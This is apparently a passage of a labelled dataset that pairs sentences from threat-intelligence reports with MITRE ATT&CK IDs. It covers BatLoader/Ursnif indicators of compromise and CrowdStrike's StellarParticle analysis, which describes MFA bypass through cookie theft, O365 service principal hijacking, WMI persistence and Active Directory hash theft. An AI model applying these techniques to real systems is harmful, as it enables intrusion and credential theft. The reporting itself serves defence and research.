            "Preventing the various attack paths utilized by the modern threat actor requires actively monitoring the threat landscape, developing, and deploying endpoint detection, and the ability to investigate logs & network data during active intrusions. ",
            "eSentire\u2019s",
            "TRU is a world-class team of threat researchers who develop new detections enriched by original threat intelligence and leverage new machine learning models that correlate multi-signal data and automate rapid response to advanced threats. ",
            "If you are not currently engaged with an MDR provider, eSentire MDR can help you reclaim the advantage and put your business ahead of disruption. ",
            "Learn what it means to have an elite team of Threat Hunters and Researchers that works for you.",
            "Connect with an eSentire Security Specialist. ",
            "Appendix https://www.mandiant.com/resources/blog/seo-poisoning-batloader-aterahttps://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/https://raw.githubusercontent.com/adbertram/Random-PowerShell-Work/master/Security/GnuPg.psm1https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls?redirectedfrom=MSDNhttps://www.0ffset.net/reverse-engineering/malware-analysis/analysing-isfb-loader/https://www.0ffset.net/reverse-engineering/malware-analysis/analyzing-isfb-second-loader/https://www.0ffset.net/reverse-engineering/challenge-1-gozi-string-crypto/https://research.openanalysis.net/config/python/yara/isfb/rm3/gozi/2022/10/06/isfb.htmlhttps://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-mars-stealerhttps://www.secureworks.com/404?aspxerrorpath=/research/gozihttps:/www.secureworks.com/research/gozihttps://owasp.org/www-community/attacks/Man-in-the-browser_attack Indicators of Compromise Name Indicators BatLoader C2 updatea1[.]com BatLoader C2 externalchecksso[.]com BatLoader C2 internalcheckssso[.]com Ursnif C2 weiqeqwns[.]com Ursnif C2 > wdeiqeqwns[.]com Ursnif C2 weiqeqwens[.]com Ursnif C2 weiqewqwns[.]com Ursnif C2 iujdhsndjfks[.]com Ursnif C2 trackingg-protectioon.cdn1.mozilla[.]net Ursnif C2 45.8.158[.]104 Ursnif C2 188.127.224[.]114 Ursnif C2 siwdmfkshsgw[.]com Vidar Stealer t[.]me/trampapanam Ursnif C2 Ijduwhsbvk[.]com Vidar Stealer nerdculture[.]de/@yoxhyp SystemBC C2 hgfiudtyukjnio[.]com SystemBC C2(overlaps with Ursnif C2 ISP) 188.127.224[.]46 Cobalt Strike C2 139.60.161[.]74 Redline C2 176.113.115[.]10 MITRE ATT&CK MITRE ATT&CK Tactic ID MITRE ATT&CK Technique Description MITRE ATT&CK Tactic Initial Access ID T1189 MITRE ATT&CK Technique Drive-by Compromise Description BatLoader is delivered via fake software installers MITRE ATT&CK Tactic User Execution ID T1204.002 MITRE ATT&CK Technique Malicious File Description The user launches the malicious MSI file MITRE ATT&CK Tactic Persistence ID T1547.001 MITRE ATT&CK Technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Description As a result of BatLoader infection, ISFB malware creates the persistence via Registry Run Keys.",
            "Syncro RMM can also be used as a persistence mechanism MITRE ATT&CK Tactic Defense Evasion ID T1562.001 MITRE ATT&CK Technique Impair Defenses:",
            "Disable or Modify Tools Description Disabling Windows Defender notifications, Task Manager and Command Prompt MITRE ATT&CK Tactic Process Injection ID T1055 Description ISFB injects itself into explorer.exe as a result of successful BatLoader infection MITRE ATT&CK Tactic Unsecured Credentials ID T1552.001 MITRE ATT&CK Technique Unsecured Credentials: Credentials In Files Description The ISFB version observed is capable of accessing browser credentials and cookies, Thunderbird and Outlook profiles, POP3, SMTP passwords. "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [
                "T1562.001",
                "T1518.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1105"
            ],
            [],
            [],
            [],
            [
                "T1562.001"
            ],
            [
                "T1059.003"
            ],
            [
                "T1105",
                "T1059.003"
            ],
            [],
            [
                "T1033",
                "T1016"
            ],
            [
                "T1016"
            ],
            [],
            [
                "T1105"
            ],
            [
                "T1027",
                "T1105"
            ],
            [
                "T1140"
            ],
            [
                "T1140"
            ],
            [
                "T1140"
            ],
            [
                "T1562.001",
                "T1140",
                "T1112"
            ],
            [],
            [
                "T1562.001"
            ],
            [],
            [],
            [
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1547.001"
            ],
            [],
            [],
            [],
            [
                "T1059.003"
            ],
            [
                "T1012"
            ],
            [
                "T1106",
                "T1055"
            ],
            [
                "T1055"
            ],
            [
                "T1027"
            ],
            [
                "T1055"
            ],
            [
                "T1027"
            ],
            [],
            [
                "T1027"
            ],
            [
                "T1027"
            ],
            [
                "T1027",
                "T1140"
            ],
            [
                "T1027",
                "T1140"
            ],
            [],
            [
                "T1140"
            ],
            [
                "T1106"
            ],
            [],
            [
                "T1140"
            ],
            [
                "T1140"
            ],
            [],
            [],
            [
                "T1112"
            ],
            [
                "T1027"
            ],
            [
                "T1027"
            ],
            [
                "T1027",
                "T1140"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [
                "T1140"
            ],
            [],
            [],
            [
                "T1573.001",
                "T1033",
                "T1082"
            ],
            [
                "T1106",
                "T1573.001",
                "T1082"
            ],
            [],
            [
                "T1059.003"
            ],
            [
                "T1047",
                "T1012"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1059.003"
            ],
            [
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1090"
            ],
            [],
            [],
            [],
            [
                "T1005",
                "T1113"
            ],
            [
                "T1219"
            ],
            [
                "T1219"
            ],
            [
                "T1219"
            ],
            [
                "T1095",
                "T1105",
                "T1090"
            ],
            [
                "T1053.005"
            ],
            [],
            [],
            [
                "T1053.005"
            ],
            [
                "T1053.005"
            ],
            [],
            [
                "T1105",
                "T1053.005"
            ],
            [],
            [],
            [],
            [],
            [
                "T1112"
            ],
            [
                "T1071.001",
                "T1112"
            ],
            [],
            [
                "T1105",
                "T1059.003"
            ],
            [
                "T1562.001"
            ],
            [
                "T1562.001"
            ],
            [
                "T1562.001"
            ],
            [],
            [
                "T1105"
            ],
            [
                "T1033",
                "T1016"
            ],
            [],
            [
                "T1105",
                "T1218.011"
            ],
            [],
            [
                "T1518.001"
            ],
            [
                "T1518.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1547.001"
            ],
            [
                "T1219"
            ],
            [
                "T1552.001",
                "T1562.001",
                "T1055"
            ]
        ]
    },
    {
        "doc_title": "Early Bird Catches the Wormhole Observations from the StellarParticle Campaign",
        "cti_report": [
            "title: Early Bird Catches the Wormhole: Observations from the StellarParticle Campaign url: https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/ StellarParticle is a campaign tracked by CrowdStrike as related to the SUNSPOT implant from the SolarWinds intrusion in December 2020 and associated with COZY BEAR (aka APT29, \u201cThe Dukes\u201d). ",
            "The StellarParticle campaign has continued against multiple organizations, with COZY BEAR using novel tools and techniques to complete their objectives, as identified by CrowdStrike incident responders and the CrowdStrike Intelligence team. ",
            "Browser cookie theft and Microsoft Service Principal manipulation are two of the novel techniques and tools leveraged in the StellarParticle campaign and are discussed in this blog. ",
            "Two sophisticated malware families were placed on victim systems in mid-2019: a Linux variant of GoldMax and a new implant dubbed TrailBlazer. ",
            "Supply chain compromises are an increasing threat that impacts a range of sectors, with threat actors leveraging access to support several motivations including financial gain (such as with the Kaseya ransomware attack) and espionage.",
            "Throughout 2020, an operation attributed to the Foreign Intelligence Service of the Russian Federation (SVR) by the U.S. government was conducted to gain access to the update mechanism of the SolarWinds IT management software and use it to broaden their intelligence collection capabilities.",
            "This activity is tracked by CrowdStrike as the StellarParticle campaign and is associated with the COZY BEAR adversary group. ",
            "This blog discusses the novel tactics and techniques leveraged in StellarParticle investigations conducted by CrowdStrike.",
            "These techniques include: Credential hopping for obscuring lateral movement Office 365 (O365) Service Principal and Application hijacking, impersonation and manipulation Stealing browser cookies for bypassing multifactor authentication Use of the TrailBlazer implant and the Linux variant of GoldMax malware Credential theft using Get-ADReplAccount Credential Hopping The majority of StellarParticle-related investigations conducted by CrowdStrike have started with the identification of adversary actions within a victim\u2019s O365 environment.",
            "This has been advantageous to CrowdStrike incident responders in that, through investigating victim O365 environments, they could gain an accurate accounting of time, account and source IP address of adversary victimization of the O365 tenant.",
            "In multiple engagements, this led CrowdStrike incident responders to identify that the malicious authentications into victim O365 tenants had originated from within the victim\u2019s own network. ",
            "Armed with this information, CrowdStrike investigators were able to identify from which systems in these internal networks the threat actor was making authentications to O365.",
            "These authentications would typically occur from servers in the environment, leading to natural investigative questions: Why would a user authenticate into O365 from a domain controller or other infrastructure server?",
            "What credentials were used as part of the session from which the O365 authentication occurred? ",
            "This led our responders to identify the occurrence of \u201ccredential hopping,\u201d where the threat actor leveraged different credentials for each step while moving laterally through the victim\u2019s network.",
            "While this particular technique is not necessarily unique to the StellarParticle campaign, it indicates a more advanced threat actor and may go unnoticed by a victim. ",
            "Below is an example of how a threat actor performs credential hopping: Gain access to the victim\u2019s network by logging into a public-facing system via Secure Shell (SSH) using a local account <user sftp> acquired during previous credential theft activities. ",
            "Use port forwarding capabilities built into SSH on the public-facing system to establish a Remote Desktop Protocol (RDP) session to an internal server (Server 1) using a domain service account. ",
            "From Server 1, establish another RDP session to a different internal server (Server 2) using a domain administrator\u2019s account. ",
            "Log in to O365 as a user with privileged access to cloud resources. ",
            "Figure 1.",
            "Example of \u201ccredential hopping\u201d technique This technique could be hard to identify in environments where defenders have little visibility into identity usage.",
            "In the example shown in Figure 1, the threat actor leveraged a service interactively, which should generate detections for defenders to investigate.",
            "However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.",
            "A solution such as CrowdStrike Falcon:registered: Identity Threat Detection would help identify these anomalous logons \u2014 and especially infrequent destinations for accounts.",
            "(Read how CrowdStrike incident responders leverage the module in investigations in this blog: Credentials, Authentications and Hygiene: Supercharging Incident Response with Falcon Identity Threat Detection.) ",
            "But how had the threat actor succeeded in authenticating into victim O365 tenants, when multifactor authentication (MFA) had been enabled for every O365 user account at each victim organization investigated by CrowdStrike? Cookie Theft to Bypass MFA Even though the victims required MFA to access cloud resources from all locations, including on premises, the threat actor managed to bypass MFA through the theft of Chrome browser cookies.",
            "The threat actor accomplished this by using administrative accounts to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.",
            "In Windows, Chrome cookies and saved passwords are encrypted using DPAPI.",
            "The user-specific encryption keys for DPAPI are stored under C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\. To leverage these encryption keys, the threat actor must first decrypt them, either by using the user account\u2019s Windows password, or, in Active Directory environments, by using a DPAPI domain backup key that is stored on domain controllers. ",
            "Once the threat actor had a Chrome cookies file from a user that had already passed an MFA challenge recently (for example, a timeout was 24 hours), they decrypted the cookies file using the user\u2019s DPAPI key.",
            "The cookies were then added to a new session using a \u201cCookie Editor\u201d Chrome extension that the threat actor installed on victim systems and removed after using. ",
            "Shellbags, Falcon Telemetry and RDP Bitmap Cache From a forensic standpoint, the use of the Cookie Editor Chrome extension would have been challenging to identify, due to the threat actor\u2019s penchant for strict operational security.",
            "This activity was identified via a NewScriptWritten event within Falcon when a JavaScript file was written to disk by a threat actor-initiated Chrome process.",
            "This event captured the unique extension ID associated with the extension, thereby allowing CrowdStrike incident responders to validate via the Chrome Store that the JavaScript file was associated with the \u201cCookie Editor\u201d plugin.",
            "This extension permitted bypassing MFA requirements, as the cookies, replayed through the Cookie Editor extension, allowed the threat actor to hijack the already MFA-approved session of a targeted user. ",
            "Shellbags were also instrumental in identifying the cookie theft activity.",
            "This artifact very clearly showed the threat actor accessing targeted users\u2019 machines in sequence and browsing to the Chrome and DPAPI directories one after another.",
            "Parsing Shellbags for an administrative account leveraged by the threat actor resulted in entries similar to the below. ",
            "Figure 2.",
            "Shellbag artifacts showing targeting of Chrome directories CrowdStrike identified forensic evidence that showed the entire attack path: browsing to a target user\u2019s Chrome and DPAPI directories via administrative share, installing the Cookie Editor extension, and using Chrome to impersonate the targeted user in the victim\u2019s cloud tenants.",
            "The decryption of the cookies is believed to have taken place offline after exfiltrating the data via the clipboard in the threat actor\u2019s RDP session. ",
            "Figure 3.",
            "Representation of lateral movement to cookie theft to O365 authentication CrowdStrike identified a similar TTP where the threat actor connected via RDP to a user\u2019s workstation with the workstation owner\u2019s account (e.g., connecting via RDP to user1-pc using the account user1).",
            "In cases where the user had only locked their screen and not signed out, the threat actor was able to take over the user\u2019s Windows session, as the RDP session would connect to the existing session of the same user.",
            "By examining RDP Bitmap Cache files, CrowdStrike was able to demonstrate that the threat actor had opened Chrome and exported all of the user\u2019s saved passwords as plaintext in a CSV file during these sessions. ",
            "Figure 4. RDP Bitmap Cache reconstruction showing exportation of Chrome passwords In addition, the threat actor visited sensitive websites that the user had access to, which in one instance allowed them to browse and download a victim\u2019s customer list.",
            "After this, the threat actor navigated to the user\u2019s Chrome history page and deleted the specific history items related to threat actor activity, leaving the rest of the user\u2019s Chrome history intact. ",
            "O365 Delegated Administrator Abuse CrowdStrike also identified a connection between StellarParticle-related campaigns and the abuse of Microsoft Cloud Solution Partners\u2019 O365 tenants.",
            "This threat actor abused access to accounts in the Cloud Solution Partner\u2019s environment with legitimate delegated administrative privileges to then gain access to several customers\u2019 O365 environments. ",
            "By analyzing Azure AD sign-ins, CrowdStrike was able to use known indicators of compromise (IOCs) to identify several threat actor logins to customer environments.",
            "These cross-tenant sign-ins were identified by looking for values in the resourceTenantId attribute that did not match the Cloud Solution Partner\u2019s own Azure tenant ID. ",
            "CrowdStrike also identified a limitation within Microsoft\u2019s Delegated Administration capabilities for Microsoft Cloud Solution Partners.",
            "While a normal O365 administrator can be provided dozens of specific administrative roles to limit the privileges granted, this same degree of customization cannot be applied to Microsoft Cloud Solution Partners that use the delegated administrator functionality in O365. ",
            "For Microsoft Cloud Solution Partners, there are only two substantial administrative options today when managing a customer\u2019s environment, Admin agent or Helpdesk agent.2",
            "The Helpdesk agent role provides very limited access that is equivalent to a password admin role, whereas the Admin agent role provides broad access more equivalent to global administrator.",
            "This limitation is scheduled to be resolved in 2022 via Microsoft\u2019s scheduled feature, Granular Delegated Admin Privileges (GDAP).3 User Access Logging (UAL) ",
            "The Windows User Access Logging (UAL) database is an extremely powerful artifact that has played an instrumental role in the investigation of StellarParticle-linked cases.",
            "In particular, UAL has helped our responders identify earlier malicious account usage that ultimately led to the identification of the aforementioned TrailBlazer implant and Linux version of the GoldMax variant. ",
            "The UAL database is available by default on Server editions of Windows starting with Server 2012.",
            "This database stores historical information on user access to various services (or in Windows parlance, Roles) on the server for up to three years (three years minus one day) by default.",
            "UAL contains information on the type of service accessed, the user that accessed the service and the source IP address from which the access occurred.",
            "One of the most useful roles recorded by UAL is the File Server role, which includes SMB access, though other role types can also be very helpful.",
            "An overview of UAL, what information it contains and how it can be leveraged in forensic investigations can be found here. ",
            "In multiple StellarParticle-related cases, because the threat actor used the same set of accounts during their operations in the environment, CrowdStrike was able to identify previous malicious activity going back multiple years, based solely on UAL data.",
            "Even though it\u2019s only available on Server 2012 and up, UAL can still be used to trace evidence of threat actor activity on legacy systems as long as the activity on the legacy system involves some (deliberate or unintentional) access to a 2012+ system.",
            "For example, in addition to tracking SMB activity, UAL databases on Domain Controllers track Active Directory access. ",
            "This allowed CrowdStrike to demonstrate that a given user account was also authenticating to Active Directory from a given source IP address two years prior.",
            "Because the user account was known to have recently been abused by the threat actor, and the source IP of the system in question was not one that account would typically be active on, the investigation led to the source system and ultimately resulted in the timeline of malicious activity being pushed back by years, with additional compromised systems even being discovered still running unique malware from that time period. ",
            "TrailBlazer and GoldMax Throughout StellarParticle-related investigations, CrowdStrike has identified two sophisticated malware families that were placed on victim systems in the mid-2019 timeframe: a Linux variant of GoldMax and a completely new family CrowdStrike refers to as TrailBlazer. ",
            "TrailBlazer Attempted to blend in with a file name that matched the system name it resided on Configured for WMI persistence (generally uncommon in 2019) Used likely compromised infrastructure for C2 Masquerades its command-and-control (C2) traffic as legitimate Google Notifications HTTP requests TrailBlazer is a sophisticated malware family that provides modular functionality and a very low prevalence.",
            "The malware shares high-level functionality with other malware families.",
            "In particular, the use of random identifier strings for C2 operations and result codes, and attempts to hide C2 communications in seemingly legitimate web traffic, were previously observed tactics, techniques and procedures (TTPs) in GoldMax and SUNBURST.",
            "TrailBlazer persists on a compromised host using WMI event subscriptions4 \u2014 a technique also used by SeaDuke \u2014 although this persistence mechanism is not exclusive to COZY BEAR.5 WMI event filter SELECT * FROM __",
            "InstanceModificationEvent",
            "WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime",
            ">= 180 AND TargetInstance.",
            "SystemUpTime < 480 WMI Event consumer (CommandLineTemplate) C:\\Program Files (x86)\\Common Files\\Adobe\\<FILENAME>.exe Filter to consumer binding CommandLineEventConsumer.",
            "Name=\"<GUID1>\"|__EventFilter.Name=\"<GUID2>\" Table 1.",
            "TrailBlazer WMI Persistence In the obfuscated example above, TrailBlazer (<FILENAME>.exe) would be executed when the system\u2019s uptime was between 180 and 480 seconds. ",
            "GoldMax (Linux variant) Attempted to blend in with a file name that matched the system name it resided on Configured for persistence via a crontab entry with a @reboot line Used likely compromised infrastructure for C2 GoldMax was first observed during post-exploitation activity in the campaign leveraging the SolarWinds supply chain attacks.",
            "Previously identified samples of GoldMax were built for the Windows platform, with the earliest identified timestamp indicating a compilation in May 2020, but a recent CrowdStrike investigation discovered a GoldMax variant built for the Linux platform that the threat actor deployed in mid-2019.",
            "This variant extends the backdoor\u2019s known history and shows that the threat actor has used the malware in post-exploitation activity targeting other platforms than Windows. ",
            "The 2019 Linux variant of the GoldMax backdoor is almost identical in functionality and implementation to the previously identified May 2020 Windows variant.",
            "The very few additions to the backdoor between 2019 and 2020 likely reflect its maturity and longstanding evasion of detections.",
            "It is likely GoldMax has been used as a long-term persistence backdoor during StellarParticle-related compromises, which would be consistent with the few changes made to the malware to modify existing functions or support additional functionality. ",
            "Persistence was established via a crontab entry for a non-root user.",
            "With the binary named to masquerade as a legitimate file on the system and placed in a hidden directory, a crontab entry was created with a @reboot line so the GoldMax binary would execute again upon system reboot.",
            "Additionally, the threat actor used the nohup command to ignore any hangup signals, and the process will continue to run even if the terminal session was terminated. ",
            "Figure 5.",
            "Crontab entry for GoldMax persistence Enumeration Tools/Unique Directory Structure Throughout our StellarParticle investigations, CrowdStrike identified what appeared to be a VBScript-based Active Directory enumeration toolkit.",
            "While the script\u2019s contents have not been recovered to date, CrowdStrike has observed identical artifacts across multiple StellarParticle engagements that suggest the same or similar tool was used. ",
            "In each instance the tool was used, Shellbags data indicated that directories with random names of a consistent length were navigated to by the same user that ran the tool.",
            "After two levels of randomly named directories, Shellbags proved the existence of subdirectories named after the FQDNs for the victims\u2019 various domains.",
            "In addition, the randomly named directories are typically created in a previously existing directory that\u2019s one level off of the root of the C drive.",
            "The randomly named directories have a consistent length where the first directory is six characters and the next directory is three characters.",
            "To date, the names of the directories have always been formed from lowercase alphanumeric characters.",
            "For example, Shellbags indicated that directories matching the naming patterns below were browsed to (where \u201cXX\u201d is a previously existing directory on the system): C:\\XX\\[a-z0-9]{6} C:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3} C:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\\domain.",
            "FQDN C:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\\domain-2.FQDN ",
            "In each case, immediately prior to the creation of the directories referenced above, there was evidence of execution of a VBScript file by the same user that browsed to the directories.",
            "This evidence typically came from a UserAssist entry for wscript.exe, as well as RecentApps entries for wscript.exe (that would also include the VBScript filename).",
            "In addition, the Jump List for wscript.exe contained evidence of the VBScript files.",
            "The name of the VBScript files varied across engagements and was generally designed to look fairly innocuous and blend in.",
            "Two examples are env.vbs and WinNet.vbs.",
            "Due to the subdirectories that are named after the FQDNs for victim domains, CrowdStrike assesses with moderate confidence that the scripts represent an AD enumeration tool used by the adversary. ",
            "Internal Wiki Access Across multiple StellarParticle investigations, CrowdStrike identified unique reconnaissance activities performed by the threat actor: access of victims\u2019 internal knowledge repositories.6 Wikis are commonly used across industries to facilitate knowledge sharing and as a source of reference for a variety of topics.",
            "While operating in the victim\u2019s internal network, the threat actor accessed sensitive information specific to the products and services that the victim organization provided.",
            "This information included items such as product/service architecture and design documents, vulnerabilities and step-by-step instructions to perform various tasks.",
            "Additionally, the threat actor viewed pages related to internal business operations such as development schedules and points of contact.",
            "In some instances these points of contact were subsequently targeted for further data collection. ",
            "The threat actor\u2019s wiki access could be considered an extension of \u201cCredential Hopping\u201d described earlier.",
            "The threat actor established RDP sessions to internal servers using privileged accounts and then accessed the wiki using a different set of credentials.",
            "CrowdStrike observed the threat actor accessing the wiki as users who would be considered \u201cnon-privileged\u201d from an Active Directory perspective but had access to sensitive data specific to the victim\u2019s products or services. ",
            "At this time, the malicious access of internal wikis is an information gathering technique that CrowdStrike has only observed in StellarParticle investigations.",
            "CrowdStrike was able to identify the wiki access primarily through forensic analysis of the internal systems used by the threat actor.",
            "Given the threat actor\u2019s penchant for clearing browser data, organizations should not rely upon the availability of these artifacts for future investigations.",
            "CrowdStrike recommends the following best practices for internal information repositories: Enable detailed access logging Ensure logs are centralized and stored for at least 180 days Create detections for anomalous activity such as access from an unusual location like a server subnet Enable MFA on the repository site, or provide access via Single Sign On (SSO) behind MFA O365 Built-in Service Principal Hijacking The threat actor connected via Remote Desktop from a Domain Controller to a vCenter server and opened a PowerShell console, then used the PowerShell command -ep bypass to circumvent the execution policy.",
            "Using the Windows Azure Active Directory PowerShell Module, the threat actor connected to the victim\u2019s O365 tenant and began performing enumeration queries.",
            "These queries were recorded in text-based logs that existed under the path C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Office365\\Powershell\\. Similar logs (for Azure AD instead of O365) can be found under the path: ",
            "C:\\Users\\<user>\\AppData\\Local\\Microsoft\\AzureAD\\Powershell\\. While the logs didn\u2019t include what data was returned by the queries, they did provide some insight such as the user account used to connect to the victim\u2019s O365 tenant (which was not the same as the user the threat actor used to RDP to the vCenter server).",
            "The logs contained commands issued and the count of the results returned for a specific command.",
            "The commands included enumeration queries such as: ListAccountSkus ListPartnerContracts ListServicePrincipals ListServicePrincipalCredentials ListRoles ListRoleMembers ListUsers ListDomains GetRoleMember GetPartnerInformation GetCompanyInformation In this case, however, the most significant and concerning log entry was one that indicated the command AddServicePrincipalCredentials was executed.",
            "By taking the timestamp that the command was executed via the PowerShell logs on the local system, CrowdStrike analyzed the configuration settings in the victim\u2019s O365 tenant and discovered that a new secret had been added to a built-in Microsoft Azure AD Enterprise Application, Microsoft StaffHub Service Principal, which had Application level permissions.",
            "Further, the newly added secret was set to remain valid for more than a decade.",
            "This data was acquired by exporting the secrets and certificates details for each Azure AD Enterprise Application. ",
            "The Service Principal (now renamed to Microsoft Teams Shifts) had the following permissions at the time the configuration settings were collected: Member.",
            "Read Member.",
            "Read.",
            "All Member.",
            "ReadWrite Member.",
            "ReadWrite.",
            "All Shift.",
            "Read Shift.",
            "ReadWrite Shift.",
            "All Team.",
            "Read Team.",
            "ReadWrite Team.",
            "All User.",
            "All User.ReadWrite.",
            "All WebHook.",
            "All CrowdStrike was unable to find Microsoft documentation, but based on open-source research,7 this application likely had the following permissions around the time of registration: Mail.",
            "Read Group.",
            "All Files.",
            "All Group.",
            "All The most notable permissions above are the Mail.",
            "Read, Files.",
            "Read and Member.",
            "ReadWrite permissions.",
            "These permissions would allow the threat actor to use the Microsoft Staffhub service principal to read all mail and SharePoint/OneDrive files in the organization, as well as create new accounts and assign administrator privileges to any account in the organization. ",
            "By running the commands from within the victim\u2019s environment, MFA requirements were bypassed due to conditional access policies not covering Service Principal sign-ins at this point of time.8 However, as explained earlier, the threat actor managed to continue to access the victim\u2019s cloud environment even when the victim enforced MFA for all connections regardless of source. ",
            "While the bulk of the evidence for this activity came from the text-based O365 PowerShell logs, the NTUSER.DAT registry hive for the user that was running the PowerShell cmdlets also included information on the accounts that were used to authenticate to the cloud.",
            "This information was stored under the registry path.",
            "Below is an example of the registry data: Figure 6.",
            "Example registry entry showing target O365 email accounts The same WSMan connection string was also located in the user\u2019s NTUSER.DAT registry hive under the path: Figure 7.",
            "WSMan connection string registry location While not strictly related to the O365 PowerShell activity, the Windows Event Log Microsoft-Windows-WinRM%4Operational.evtx also included information on connection attempts made to external O365 tenants.",
            "This information was logged under Event ID 6.",
            "Below is an example of what the event included: Figure 8.",
            "Windows Event Log entry showing connection to O365 tenants O365 Company Service Principal Manipulation ",
            "The threat actor also deployed several layers of persistence utilizing both pre-existing and threat actor-created Service Principals with the ultimate goal of gaining global access to email. ",
            "Attacker-created Service Principal First, the threat actor used a compromised O365 administrator account to create a new Service Principal with a generic name.",
            "This Service Principal was granted company administrator privileges.",
            "From there, the threat actor added a credential to this Service Principal so that they could access the Service Principal directly, without use of an O365 user account. ",
            "These actions were recorded in Unified Audit Logs with the following three operation names: Add service principal Add member to role Add service principal credentials. ",
            "Update Service Principal Company-Created Service Principal Hijacking Next, the threat actor utilized the threat actor-created Service Principal to take control of a second Service Principal.",
            "This was done by adding credentials to this second Service Principal, which was legitimately created by the company.",
            "This now compromised company-created Service Principal had mail.read graph permissions consented on behalf of all users within the tenant. ",
            "This action was recorded by just one operation type in Unified Audit Logs.",
            "This operation type is named Add service principal credentials. ",
            "Mail.",
            "Read Service Principal Abuse Finally, the threat actor utilized the compromised Service Principal with the assigned mail.read permissions to then read emails of several different users in the company\u2019s environment. ",
            "CrowdStrike was able to use the Unified Audit Logs\u2019 (UAL) MailItemsAccessed operation events to see the exact emails the threat actor viewed, as the majority of the users in the tenant were assigned O365 E5 licenses.",
            "When performing analysis on the UAL, CrowdStrike used the ClientAppId value within the MailItemsAccessed operation and cross-correlated with the Application ID of the compromised service principal to see what activities were performed by the threat actor. ",
            "O365 Application Impersonation Another consistent TTP identified during StellarParticle investigations has been the abuse of the ApplicationImpersonation9 role.",
            "When this role was assigned to a particular user that was controlled by the threat actor, it allowed the threat actor to impersonate any user within the O365 environment.",
            "These impersonated events are not logged verbosely by the Unified Audit Logs and can be difficult to detect. ",
            "While the assignment of these ApplicationImpersonation roles were not logged in the Unified Audit Logs, CrowdStrike was able to identify this persistence mechanism via the management role configuration settings, which can be exported with the Exchange PowerShell command: Get-ManagementRoleAssignment -Role ApplicationImpersonation. ",
            "CrowdStrike then analyzed the exported configuration settings and identified several users (not service accounts) that the threat actor likely gave direct ApplicationImpersonation roles during the known periods of compromise. ",
            "Remote Tasklist The threat actor attempted to remotely list running processes on systems using tasklist.exe.",
            "As tasklist uses WMI \u201cunder the hood,\u201d this activity was captured by Falcon as SuspiciousWmiQuery events that included the query and the source system.",
            "Additionally, the failed (not successful) process listing resulted in a DCOM error that was logged in the System.evtx event log under Event ID 10028.",
            "A sample of the information included with this event is below: Figure 9.",
            "Event ID 10028 showing failed execution of remote tasklist This remote process listing was consistently used by the threat actor targeting the same or similar lists of remote systems, and the owners of the targeted systems also happened to be the individuals with cloud access that the threat actor was interested in.",
            "While unproven, it\u2019s possible the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.",
            "This is because a current or recent Chrome session to the victim\u2019s cloud tenants would be potentially beneficial in the hijacking of sessions that the threat actor performed in order to access the victim\u2019s cloud resources. ",
            "FTP Scanning/Identity Knowledge ",
            "In one instance, after being evicted from a victim environment, the threat actor began probing external services as a means to regain access, initially focusing on (S)FTP servers that were internet-accessible.",
            "Logs on the servers indicated that the threat actor attempted to log in with multiple valid accounts and in several cases was successful.",
            "There was little to no activity during the (S)FTP sessions.",
            "This likely was an exercise in attempting to identify misconfigured (S)FTP accounts that also had shell access, similar to what\u2019s described in the Credential Hopping section earlier.",
            "Some of the accounts used were not in the victim\u2019s Active Directory, as these were accounts for customers of the victim and stored in a separate LDAP database.",
            "However, the threat actor had knowledge of these accounts and used them on the correct systems, which further confirmed that the threat actor had advanced knowledge of the victim\u2019s environment. ",
            "After confirming the FTP accounts did not provide shell access into the environment, the threat actor began attempting to connect into the environment via VPN.",
            "The threat actor attempted to log in to the VPN using several user accounts but was prevented from connecting, either due to not having the correct password, or due to having the correct password but not getting past the recently implemented MFA requirement.",
            "Eventually, the threat actor attempted an account that they had the correct password for but that had not been set up with MFA.",
            "This resulted in a prompt being displayed to the threat actor that included an MFA setup link.",
            "The threat actor subsequently set up MFA for the account and successfully connected to the victim\u2019s network via VPN. ",
            "TA Masquerading of System Names During the attempted and successful VPN authentications described above, the threat actor ensured the hostname of their system matched the naming convention of hostnames in the victim\u2019s environment.",
            "This again showed a strong knowledge of the victim\u2019s internal environment on the part of the threat actor.",
            "Not only did the masqueraded hostnames follow the correct naming convention from a broad perspective, they were also valid in terms of what would be expected for the user account the threat actor leveraged (i.e., in terms of the site name and asset type indicated in the hostname).",
            "This masqueraded hostname technique has been observed at multiple StellarParticle-related investigations. ",
            "Credential Theft Using Get-ADReplAccount ",
            "In one example, the threat actor connected into the victim\u2019s environment via a VPN endpoint that did not have MFA enabled.",
            "Once connected to the VPN, the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.",
            "The threat actor subsequently ran the DSInternals command Get-ADReplAccount targeting two of the victim\u2019s domains.",
            "This command uses the Microsoft Directory Replication Service (MS-DRSR) protocol and specifically the IDL_DRSGetNCChanges method to return account information from Active Directory such as the current NTLM password hashes and previous password hashes used for enforcing password reuse restrictions.",
